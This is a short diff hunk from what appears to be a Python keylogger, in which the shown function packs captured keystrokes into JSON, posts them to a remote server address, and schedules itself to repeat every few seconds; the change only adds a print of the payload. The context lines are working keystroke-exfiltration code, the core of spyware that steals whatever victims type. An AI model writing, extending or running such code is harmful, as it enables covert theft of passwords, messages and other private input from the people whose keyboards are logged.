@@ -12,7 +12,7 @@ def send_post_req():
     # format captured keys and send
     payload = json.dumps({"keyboardData" : text})
     r = requests.post(addr, data=payload, headers={"Content-Type" : "application/json"})
-
+    print(payload)
     # every n seconds send info to the server
     timer = threading.Timer(interval, send_post_req)
     timer.start() 
